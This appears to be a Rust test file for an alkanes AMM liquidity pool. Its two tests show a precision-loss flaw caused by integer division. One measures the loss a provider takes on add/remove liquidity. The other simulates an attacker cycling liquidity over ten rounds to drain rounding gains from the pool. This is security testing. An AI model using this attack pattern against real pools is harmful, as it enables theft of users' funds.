use alkanes_support::cellpack::Cellpack;
use alkanes_support::trace::{Trace, TraceEvent};
use anyhow::Result;
use bitcoin::blockdata::transaction::OutPoint;
use bitcoin::{Block, Witness};
use init_pools::{insert_init_pool_liquidity_txs, test_amm_pool_init_fixture};
use metashrew_support::utils::consume_u128;
use num::integer::Roots;
use protorune::test_helpers::create_block_with_coinbase_tx;
use protorune_support::balance_sheet::{BalanceSheet, BalanceSheetOperations, ProtoruneRuneId};

use crate::tests::helper::*;
use alkane_helpers::clear;
use alkanes::indexer::index_block;
use alkanes::tests::helpers::{self as alkane_helpers, get_last_outpoint_sheet};
use alkanes::view;
use alkanes_support::id::AlkaneId;
#[allow(unused_imports)]
use metashrew_core::{get_cache, index_pointer::IndexPointer, println, stdio::stdout};
use std::fmt::Write;
use wasm_bindgen_test::wasm_bindgen_test;

use super::helper::add_liquidity::{calc_lp_balance_from_add_liquidity, insert_add_liquidity_txs};
use super::helper::path_provider::create_path_provider_insert_path_block;
use super::helper::remove_liquidity::insert_remove_liquidity_txs;
use super::helper::swap::check_swap_runtime_balance;

/// This test demonstrates how precision loss in liquidity calculations can lead to a loss of funds.
/// The vulnerability occurs due to integer division in both add_liquidity and burn functions.
#[wasm_bindgen_test]
fn test_precision_loss_vulnerability() -> Result<()> {
    clear();

    // Initialize pool with very unbalanced reserves to maximize precision loss effects
    // Using a large number for one token and a small number for the other
    let (amount1, amount2) = (1_000_000_000_000_000_000u128, 100u128);

    // Initialize the pool
    let (init_block, deployment_ids, mut runtime_balances) =
        test_amm_pool_init_fixture(amount1, amount2, true)?;

    // Get the initial total supply of LP tokens
    let initial_total_supply = (amount1 * amount2).sqrt() - 1000; // MINIMUM_LIQUIDITY = 1000

    // Calculate the initial invariant (k = x * y)
    let initial_invariant = amount1 * amount2;
    println!("Initial invariant: {}", initial_invariant);
    println!("Initial LP token supply: {}", initial_total_supply);

    // Now we'll add a small amount of liquidity that should cause precision loss
    // The key is to add amounts that result in a very small fraction of LP tokens
    // that gets truncated to zero due to integer division

    // Add a very small amount of liquidity that will cause precision loss
    let add_amount1 = 1_000_000u128;
    let add_amount2 = 1u128;

    let block_height = 840_001;
    let mut add_liquidity_block = create_block_with_coinbase_tx(block_height);
    let input_outpoint = OutPoint {
        txid: init_block.txdata[init_block.txdata.len() - 1].compute_txid(),
        vout: 0,
    };

    // Add liquidity
    insert_add_liquidity_txs(
        add_amount1,
        add_amount2,
        deployment_ids.owned_token_1_deployment,
        deployment_ids.owned_token_2_deployment,
        deployment_ids.amm_pool_1_deployment,
        &mut add_liquidity_block,
        input_outpoint,
    );

    // Process the block
    index_block(&add_liquidity_block, block_height)?;

    // Calculate what LP tokens should be minted based on the formula
    let expected_lp_tokens = calc_lp_balance_from_add_liquidity(
        amount1,
        amount2,
        add_amount1,
        add_amount2,
        initial_total_supply,
    );

    // Get the actual LP tokens minted
    let sheet = get_last_outpoint_sheet(&add_liquidity_block)?;
    let actual_lp_tokens = sheet.get_cached(&deployment_ids.amm_pool_1_deployment.into());

    println!(
        "Expected LP tokens from add_liquidity: {}",
        expected_lp_tokens
    );
    println!("Actual LP tokens received: {}", actual_lp_tokens);

    // Now remove all liquidity
    let block_height = 840_002;
    let mut remove_liquidity_block = create_block_with_coinbase_tx(block_height);
    let input_outpoint = OutPoint {
        txid: add_liquidity_block.txdata[add_liquidity_block.txdata.len() - 1].compute_txid(),
        vout: 0,
    };

    // Remove all liquidity
    insert_remove_liquidity_txs(
        actual_lp_tokens,
        &mut remove_liquidity_block,
        input_outpoint,
        deployment_ids.amm_pool_1_deployment,
    );

    // Process the block
    index_block(&remove_liquidity_block, block_height)?;

    // Calculate what tokens should be returned based on the formula
    let new_total_supply = initial_total_supply + actual_lp_tokens;
    let expected_token1_return = actual_lp_tokens * (amount1 + add_amount1) / new_total_supply;
    let expected_token2_return = actual_lp_tokens * (amount2 + add_amount2) / new_total_supply;

    // Get the actual tokens returned
    let sheet = get_last_outpoint_sheet(&remove_liquidity_block)?;
    let actual_token1_return = sheet.get_cached(&deployment_ids.owned_token_1_deployment.into());
    let actual_token2_return = sheet.get_cached(&deployment_ids.owned_token_2_deployment.into());

    println!("Expected token1 return: {}", expected_token1_return);
    println!("Actual token1 return: {}", actual_token1_return);
    println!("Expected token2 return: {}", expected_token2_return);
    println!("Actual token2 return: {}", actual_token2_return);

    // Calculate the loss of funds
    let token1_loss = add_amount1.saturating_sub(actual_token1_return);
    let token2_loss = add_amount2.saturating_sub(actual_token2_return);

    println!("Token1 loss: {}", token1_loss);
    println!("Token2 loss: {}", token2_loss);

    // Demonstrate that there's a loss of funds due to precision loss
    // The user should get back less than they put in
    assert!(
        token1_loss > 0 || token2_loss > 0,
        "No loss of funds detected"
    );

    // Calculate the final invariant to show that it has increased
    // This increase represents value captured by the pool due to precision loss
    let final_reserves_a = (amount1 + add_amount1) - actual_token1_return;
    let final_reserves_b = (amount2 + add_amount2) - actual_token2_return;
    let final_invariant = final_reserves_a * final_reserves_b;

    println!("Final invariant: {}", final_invariant);
    println!(
        "Invariant increase: {}",
        final_invariant - initial_invariant
    );

    // The invariant should have increased, indicating value has been captured by the pool
    assert!(
        final_invariant > initial_invariant,
        "Invariant did not increase"
    );

    Ok(())
}

/// This test demonstrates how an attacker can exploit precision loss to drain funds from a pool
/// by repeatedly adding and removing liquidity in a way that accumulates rounding errors in their favor.
#[wasm_bindgen_test]
fn test_precision_loss_attack() -> Result<()> {
    clear();

    // Initialize pool with very unbalanced reserves
    let (amount1, amount2) = (1_000_000_000_000_000_000u128, 100u128);

    // Initialize the pool
    let (init_block, deployment_ids, mut runtime_balances) =
        test_amm_pool_init_fixture(amount1, amount2, true)?;

    // Calculate the initial invariant (k = x * y)
    let initial_invariant = amount1 * amount2;
    println!("Initial invariant: {}", initial_invariant);

    // Track the attacker's token balances
    let mut attacker_token1 = 1_000_000_000u128;
    let mut attacker_token2 = 1_000u128;

    // Track the pool's reserves
    let mut pool_token1 = amount1;
    let mut pool_token2 = amount2;

    // Perform multiple rounds of adding and removing liquidity to accumulate rounding errors
    let num_rounds = 10;

    let mut add_liquidity_block: Block = create_block_with_coinbase_tx(840_000);
    let mut remove_liquidity_block: Block = create_block_with_coinbase_tx(840_000);

    for round in 0..num_rounds {
        println!("Round {}", round + 1);

        // Calculate a small amount to add that will cause precision loss
        let add_amount1 = attacker_token1 / 100;
        let add_amount2 = 0u128;

        // Update attacker's balances
        attacker_token1 -= add_amount1;
        attacker_token2 -= add_amount2;

        // Add liquidity
        let block_height = 840_001 + (round * 2);
        add_liquidity_block = create_block_with_coinbase_tx(block_height);
        let input_outpoint = if round == 0 {
            OutPoint {
                txid: init_block.txdata[init_block.txdata.len() - 1].compute_txid(),
                vout: 0,
            }
        } else {
            OutPoint {
                txid: remove_liquidity_block.txdata[remove_liquidity_block.txdata.len() - 1]
                    .compute_txid(),
                vout: 0,
            }
        };

        insert_add_liquidity_txs(
            add_amount1,
            add_amount2,
            deployment_ids.owned_token_1_deployment,
            deployment_ids.owned_token_2_deployment,
            deployment_ids.amm_pool_1_deployment,
            &mut add_liquidity_block,
            input_outpoint,
        );

        // Process the block
        index_block(&add_liquidity_block, block_height)?;

        // Update pool reserves
        pool_token1 += add_amount1;
        pool_token2 += add_amount2;

        // Get the LP tokens minted
        let sheet = get_last_outpoint_sheet(&add_liquidity_block)?;
        let lp_tokens = sheet.get_cached(&deployment_ids.amm_pool_1_deployment.into());

        println!("LP tokens received: {}", lp_tokens);

        // Remove liquidity
        let block_height = 840_002 + (round * 2);
        remove_liquidity_block = create_block_with_coinbase_tx(block_height);
        let input_outpoint = OutPoint {
            txid: add_liquidity_block.txdata[add_liquidity_block.txdata.len() - 1].compute_txid(),
            vout: 0,
        };

        insert_remove_liquidity_txs(
            lp_tokens,
            &mut remove_liquidity_block,
            input_outpoint,
            deployment_ids.amm_pool_1_deployment,
        );

        // Process the block
        index_block(&remove_liquidity_block, block_height)?;

        // Get the tokens returned
        let sheet = get_last_outpoint_sheet(&remove_liquidity_block)?;
        let token1_return = sheet.get_cached(&deployment_ids.owned_token_1_deployment.into());
        let token2_return = sheet.get_cached(&deployment_ids.owned_token_2_deployment.into());

        println!("Token1 returned: {}", token1_return);
        println!("Token2 returned: {}", token2_return);

        // Update attacker's balances
        attacker_token1 += token1_return;
        attacker_token2 += token2_return;

        // Update pool reserves
        pool_token1 -= token1_return;
        pool_token2 -= token2_return;

        // Calculate profit/loss for this round
        let token1_profit = token1_return as i128 - add_amount1 as i128;
        let token2_profit = token2_return as i128 - add_amount2 as i128;

        println!("Token1 profit/loss: {}", token1_profit);
        println!("Token2 profit/loss: {}", token2_profit);
    }

    // Calculate the final invariant
    let final_invariant = pool_token1 * pool_token2;

    println!("Initial token1: {}", 1_000_000_000u128);
    println!("Final token1: {}", attacker_token1);
    println!("Initial token2: {}", 1_000u128);
    println!("Final token2: {}", attacker_token2);

    println!("Initial invariant: {}", initial_invariant);
    println!("Final invariant: {}", final_invariant);
    println!(
        "Invariant increase: {}",
        final_invariant - initial_invariant
    );

    // The attacker should have gained tokens due to precision loss
    let token1_gain = attacker_token1 as i128 - 1_000_000_000i128;
    let token2_gain = attacker_token2 as i128 - 1_000i128;

    println!("Token1 total gain: {}", token1_gain);
    println!("Token2 total gain: {}", token2_gain);

    // Assert that the attacker has gained tokens or the invariant has increased
    assert!(
        token1_gain > 0 || token2_gain > 0 || final_invariant > initial_invariant,
        "No precision loss exploitation detected"
    );

    Ok(())
}
